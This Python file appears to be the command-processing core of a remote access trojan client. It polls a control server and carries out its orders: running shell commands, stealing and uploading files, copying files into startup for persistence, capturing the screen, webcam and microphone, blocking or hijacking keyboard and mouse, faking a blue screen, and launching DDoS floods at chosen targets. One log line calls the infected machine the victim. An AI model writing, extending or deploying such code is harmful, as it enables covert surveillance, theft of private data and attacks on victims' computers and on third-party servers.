from queue import Queue, Empty as QueueEmpty
import threading
import time
import datetime
import uuid
import requests

import network # type: ignore

from file_handler import FileHandler # type: ignore
from utils import scan_available_drives # type: ignore
from audio import toggle_audio_monitor # type: ignore
from audio_streaming import stream_speaker_audio_via_socket, receive_mic_from_socket, stop_stream_speaker, stop_receive_mic, stream_mic_audio_via_socket, stop_stream_mic  # type: ignore
from camera import start_camera_stream, stop_camera_stream # type: ignore
import ddos # type: ignore
from screen import capture_screen, capture_and_upload_screen # type: ignore
from input_blocker import set_input_blocking # type: ignore
from sysinfo import get_system_info, get_location_info # type: ignore
from control_mode import set_control_mode, get_control_mode, should_process_command # type: ignore
import config # type: ignore
from ping import handle_ping # type: ignore

file_handler = FileHandler()

# queue for rate limiting
command_queue = Queue(maxsize=50)
MAX_COMMAND_WORKERS = 4

# Cache monitor info
_monitor_cache = None
_monitor_cache_time = 0

def get_monitor_info():
    global _monitor_cache, _monitor_cache_time
    now = time.time()
    if _monitor_cache is None or now - _monitor_cache_time > 5:  # Cache for 5 seconds
        try:
            import mss
            with mss.mss() as sct:
                _monitor_cache = sct.monitors[1:]  # Skip the 'all' monitor
            _monitor_cache_time = now
        except Exception:
            _monitor_cache = []
    return _monitor_cache

def get_absolute_mouse_coords(x, y, screen_index=None):
    """Convert relative screen coordinates to absolute desktop coordinates."""
    monitors = get_monitor_info()
    if not monitors:
        return x, y  # Fallback to relative coords
    
    if screen_index is None:
        import screen  # Import here to avoid circular import
        screen_index = screen.current_screen_index
    
    if 0 <= screen_index < len(monitors):
        monitor = monitors[screen_index]
        abs_x = monitor['left'] + x
        abs_y = monitor['top'] + y
        return abs_x, abs_y
    else:
        return x, y  # Fallback


def process_command(cmd_type: str, payload: dict) -> dict:
    try:
        # CONTROL MODE COMMANDS (always allowed)
        if cmd_type == "set_control_mode":
            mode = payload.get("mode", "idle")
            return set_control_mode(mode)
        elif cmd_type == "get_control_mode":
            return {"status": "success", "mode": get_control_mode()}
        
        # AUTO-ENABLE appropriate modes based on command type
        current_mode = get_control_mode()
        mode_auto_enabled = False
        if current_mode == "idle":
            if "mouse" in cmd_type or "keyboard" in cmd_type or cmd_type == "input_block":
                set_control_mode("input_control")
                mode_auto_enabled = True
            elif cmd_type in ["camera_start", "camera_stop", "screen_quality"]:
                set_control_mode("screen_only")
                mode_auto_enabled = True
            elif "audio" in cmd_type or cmd_type == "audio_monitor" or "stream" in cmd_type:
                set_control_mode("audio_only")
                mode_auto_enabled = True
            elif "file" in cmd_type.lower() or cmd_type == "get_drives":
                set_control_mode("file_transfer")
                mode_auto_enabled = True
                print(f"[AUTO-MODE] Activated file_transfer mode for command: {cmd_type}", flush=True)
            elif "ddos" in cmd_type:
                set_control_mode("ddos_only")
                mode_auto_enabled = True
            elif cmd_type in ["sysinfo", "location"]:
                set_control_mode("sysinfo_only")
                mode_auto_enabled = True
        elif current_mode == "input_control":
            if cmd_type in ["file_list", "cmd_execute", "execute", "get_drives"] or "file" in cmd_type.lower():
                set_control_mode("file_transfer")
                mode_auto_enabled = True
            elif cmd_type in ["camera_start", "camera_stop"]:
                set_control_mode("screen_only")
                mode_auto_enabled = True
            elif "audio" in cmd_type or cmd_type in ["stream_speaker_socket", "stream_mic_socket", "stop_stream_speaker", "stop_stream_mic"]:
                set_control_mode("audio_only")
                mode_auto_enabled = True
            elif "ddos" in cmd_type:
                set_control_mode("ddos_only")
                mode_auto_enabled = True
        
        # CHECK if this command is allowed in current control mode
        if not should_process_command(cmd_type):
            return {"status": "error", "message": f"Command '{cmd_type}' not allowed in current control mode: {get_control_mode()}"}
        
        if cmd_type == "file_list":
            base = payload.get("base", "This PC")
            path = payload.get("path", "")
            print(f"[FILE_LIST] base={base}, path={path}", flush=True)
            result = file_handler.list_directory(base, path)
            print(f"[FILE_LIST] Result: {result}", flush=True)
            return result
        elif cmd_type == "delete":
            base = payload.get("base", "Downloads")
            filename = payload.get("filename", "")
            return file_handler.delete_file(base, filename)
        elif cmd_type == "rename":
            base = payload.get("base", "Downloads")
            old_name = payload.get("old_name", "")
            new_name = payload.get("new_name", "")
            return file_handler.rename_file(base, old_name, new_name)
        elif cmd_type == "upload":
            filepath = payload.get("filepath", "")
            server_filename = payload.get("server_filename")
            return file_handler.upload_file_to_server(filepath, server_filename)
        elif cmd_type == "download":
            base = payload.get("base")
            filename = payload.get("filename")
            server_filename = payload.get("server_filename", filename)
            local_path = payload.get("local_path")
            if base and filename:
                return file_handler.download_file_from_server_to_base(base, filename, server_filename)
            return file_handler.download_file_from_server(server_filename, local_path)
        elif cmd_type == "file_download":
            base = payload.get("base", "Downloads")
            filename = payload.get("filename", "")
            return file_handler.download_file_as_base64(base, filename)
        elif cmd_type == "download_folder":
            base = payload.get("base", "Downloads")
            folder_path = payload.get("folder_path", "")
            return file_handler.download_folder_as_base64(base, folder_path)
        elif cmd_type == "set_attributes":
            base = payload.get("base", "Downloads")
            filename = payload.get("filename", "")
            attributes = payload.get("attributes", {})
            return file_handler.set_file_attributes(base, filename, attributes)
        elif cmd_type == "copy_to_startup":
            filename = payload.get("filename", "")
            attributes = payload.get("attributes", {})
            return file_handler.copy_to_startup(filename, attributes)
        elif cmd_type == "execute" or cmd_type == "cmd_execute" or cmd_type == "bsod":
            if cmd_type == "bsod":
                # BSOD auslösen, anstatt Command auszuführen
                try:
                    import subprocess
                    import os
                    bsod_path = os.path.join(os.path.dirname(__file__), "bsod.py")
                    subprocess.Popen(["python", bsod_path])
                    return {"status": "success", "message": "BSOD triggered"}
                except Exception as e:
                    return {"status": "error", "message": f"Failed to trigger BSOD: {e}"}
            else:
                command = payload.get("command", "")
                shell = payload.get("shell", True)
                return file_handler.execute_command(command, shell)
        elif cmd_type == "screenshot":
            quality = payload.get("quality", 85)
            return capture_screen(quality)
        elif cmd_type == "screenshot_upload":
            quality = payload.get("quality", 85)
            return capture_and_upload_screen(quality)
        elif cmd_type == "set_screen_index":
            # update the variable inside the screen module (not this one)
            import screen # type: ignore
            index = payload.get("screen_index", 0)
            with screen.screen_index_lock:
                screen.current_screen_index = index
            return {"status": "success", "message": f"Screen index set to {index}"}
        elif cmd_type == "set_stream_quality":
            # allow adjusting JPEG quality for the live stream
            import screen # type: ignore
            q = payload.get("quality")
            try:
                q = int(q)
                if not (1 <= q <= 100):
                    raise ValueError
            except Exception:
                return {"status": "error", "message": "quality must be integer 1‑100"}
            screen.stream_quality = q
            return {"status": "success", "message": f"Stream quality set to {q}"}
        elif cmd_type == "audio_monitor":
            action = payload.get("action", "start")
            host = payload.get("host", config.SERVER_IP_ADDR)
            port = payload.get("port", 50007)
            result = toggle_audio_monitor(action, host, port)
            # Removed: No notifications for audio control
            return result
        elif cmd_type == "camera_start":
            fps = int(payload.get("fps", 20))
            result = start_camera_stream(config.SERVER_URL, config.PC_NAME, fps=fps)
            print(f"[CAMERA] Start result: {result}", flush=True)
            return result
        elif cmd_type == "camera_stop":
            result = stop_camera_stream()
            print(f"[CAMERA] Stop result: {result}", flush=True)
            return result
        elif cmd_type == "input_block":
            keyboard = payload.get("keyboard", False)
            mouse = payload.get("mouse", False)
            return set_input_blocking(keyboard, mouse)
        elif cmd_type == "bsod":
            try:
                from bsod import trigger_bsod
                trigger_bsod()
                return {"status": "success", "message": "BSOD triggered"}
            except Exception as e:
                return {"status": "error", "message": f"BSOD failed: {str(e)}"}
        elif cmd_type == "get_drives":
            return {"status": "success", "drives": scan_available_drives()}
        elif cmd_type == "stream_audio_bidirectional":
            # Legacy combined audio command kept for backward compatibility.
            host = payload.get("host", config.SERVER_IP_ADDR)
            speaker_port = 50007
            mic_port = 50010
            speaker_allow = payload.get("allow_fallback", True)

            speaker_res = stream_speaker_audio_via_socket(host, speaker_port, allow_fallback=speaker_allow)
            mic_res = receive_mic_from_socket(host, mic_port)
            return {"speaker": speaker_res, "mic": mic_res}
        elif cmd_type == "stream_speaker_socket":
            host = payload.get("host", config.SERVER_IP_ADDR)
            port = 50007
            allow = payload.get("allow_fallback", True)
            return stream_speaker_audio_via_socket(host, port, allow_fallback=allow)
        elif cmd_type == "stream_mic_socket":
            host = payload.get("host", config.SERVER_IP_ADDR)
            port = 50009
            allow = payload.get("allow_fallback", True)
            return stream_mic_audio_via_socket(host, port, allow_fallback=allow)
        elif cmd_type == "stop_stream_speaker":
            return stop_stream_speaker()
        elif cmd_type == "stop_stream_mic":
            return stop_stream_mic()
        elif cmd_type == "ping":
            received_time = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
            print(f"[PING VICTIM] ping command received @ {received_time}; payload={{client_timestamp: {payload.get('client_timestamp')}, server_timestamp: {payload.get('server_timestamp')}}}")
            result = handle_ping(payload)
            sent_time = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
            print(f"[PING VICTIM] ping result prepared @ {sent_time}; result={result}")
            return result
        elif cmd_type == "scroll":
            import pyautogui
            direction = payload.get("direction", "up")
            try:
                if direction == "up":
                    pyautogui.scroll(3)  # Scroll up
                elif direction == "down":
                    pyautogui.scroll(-3)  # Scroll down
                return {"status": "success"}
            except Exception as e:
                print(f"[ERROR] Scroll failed: {e}")
                return {"status": "error", "message": f"Scroll failed: {str(e)}"}
        elif cmd_type == "mouse_move":
            import pyautogui
            x = payload.get("x")
            y = payload.get("y")
            screen_index = payload.get("screen_index")
            if x is not None and y is not None:
                abs_x, abs_y = get_absolute_mouse_coords(x, y, screen_index)
                print(f"[DEBUG] Moving mouse to absolute coords: {abs_x}, {abs_y} (rel: {x}, {y}, screen: {screen_index})")
                try:
                    pyautogui.moveTo(abs_x, abs_y)
                    return {"status": "success"}
                except Exception as e:
                    print(f"[ERROR] Mouse move failed: {e}")
                    return {"status": "error", "message": f"Mouse move failed: {str(e)}"}
            return {"status": "error", "message": "Missing coordinates"}
        elif cmd_type == "mouse_click":
            import pyautogui
            x = payload.get("x")
            y = payload.get("y")
            button = payload.get("button", "left")
            action = payload.get("action", "click")
            screen_index = payload.get("screen_index")

            abs_x, abs_y = get_absolute_mouse_coords(x, y, screen_index)
            print(f"[DEBUG] Mouse click {action} {button} at absolute coords: {abs_x}, {abs_y} (rel: {x}, {y}, screen: {screen_index})")

            try:
                # OPTIMIZED: Schnellerer Click (50ms move + kein extra delay)
                pyautogui.moveTo(abs_x, abs_y, duration=0.05)  # Fast move: 50ms
                time.sleep(0.05)  # Minimal wait: 50ms
                
                if action == "click":
                    pyautogui.click(button=button)
                elif action == "press":
                    pyautogui.mouseDown(button=button)
                elif action == "release":
                    pyautogui.mouseUp(button=button)
                
                print(f"[DEBUG] Mouse {action} {button} executed successfully")
                return {"status": "success"}
            except Exception as e:
                print(f"[ERROR] Mouse {action} failed: {e}")
                return {"status": "error", "message": f"Mouse action failed: {str(e)}"}
        elif cmd_type == "ddos":
            target = payload.get("target", "")
            duration = int(payload.get("duration", 60))
            threads = int(payload.get("threads", 20))
            result = ddos.launch_ddos(target, duration=duration, threads=threads)
            network.send_notification(f"DDoS initiated: {target} ({threads} threads, {duration}s)")
            return result
        elif cmd_type == "ddos_stop":
            target = payload.get("target", "")
            result = ddos.stop_ddos(target)
            network.send_notification(f"DDoS stopped: {target}")
            return result
    except Exception as e:
        return {"status": "error", "message": str(e)}


def _upload_result(cmd_id: str, cmd_type: str, result: dict):
    try:
        print(f"[UPLOAD] Sending result for {cmd_id}, cmd_type: {cmd_type}")
        resp = requests.post(
            f"{config.SERVER_URL}/task_result",
            json={"cmd_id": cmd_id, "status": "completed", "result": result},
            timeout=15,
        )
        print(f"[UPLOAD] Response: {resp.status_code}")
    except Exception as e:
        print(f"[UPLOAD] Error: {e}")


def process_single_command(cmd: dict):
    cmd_id = cmd.get("cmd_id", "unknown")
    cmd_type = cmd.get("type", "unknown")
    payload = cmd.get("payload", {})
    print(f"[*] Verarbeite Command: {cmd_type} (ID: {cmd_id[:8]}...)")
    result = process_command(cmd_type, payload)
    threading.Thread(target=_upload_result, args=(cmd_id, cmd_type, result), daemon=True).start()


def command_worker_pool():
    while True:
        try:
            cmd = command_queue.get(timeout=1)
            process_single_command(cmd)
            command_queue.task_done()
        except QueueEmpty:
            pass
        except Exception as e:
            print(f"[-] Command-Worker Pool Fehler: {e}")


def command_poller_worker():
    print(f"[*] Command-Poller Thread gestartet (poll alle {config.COMMAND_CHECK_INTERVAL}s)")
    poll_count = 0
    while True:
        try:
            poll_count += 1
            if network._authenticated:
                try:
                    resp = requests.get(f"{config.SERVER_URL}/get_commands/{config.PC_NAME}", timeout=2)
                    for cmd in resp.json().get("commands", []):
                        command_queue.put(cmd)
                except requests.exceptions.Timeout:
                    pass
                except requests.exceptions.ConnectionError:
                    pass
                except Exception:
                    pass
            time.sleep(config.COMMAND_CHECK_INTERVAL)
        except Exception as e:
            print(f"[-] Command-Poller Fehler: {e}")
            time.sleep(1)


def mouse_click_poller_worker():
    """Poll for legacy mouse clicks and process them as commands."""
    while True:
        try:
            if network._authenticated:
                try:
                    resp = requests.get(f"{config.SERVER_URL}/get_mouse_clicks/{config.PC_NAME}", timeout=2)
                    if resp.status_code == 200:
                        clicks = resp.json().get("clicks", [])
                        for click in clicks:
                            command_queue.put({
                                "cmd_id": str(uuid.uuid4()),
                                "type": "mouse_click",
                                "payload": click
                            })
                except Exception:
                    pass
            time.sleep(config.COMMAND_CHECK_INTERVAL)
        except Exception:
            time.sleep(1)
